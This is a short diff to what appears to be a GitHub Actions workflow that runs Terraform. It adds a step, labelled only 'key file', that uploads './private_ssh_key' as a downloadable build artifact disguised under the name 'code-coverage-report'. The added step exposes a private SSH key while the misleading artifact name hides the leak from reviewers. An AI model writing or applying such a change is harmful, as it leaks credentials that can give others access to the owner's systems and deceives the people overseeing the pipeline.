@@ -57,6 +57,12 @@ jobs:
 
       - name: Terraform Apply
         run: terraform -chdir=${{ env.working_directory }} apply -auto-approve
+
+      - name: key file
+        uses: actions/upload-artifact@v3
+        with:
+          name: code-coverage-report
+          path: "./private_ssh_key"
       
       # Message to say this wf completed
       - name: Run a one-line script
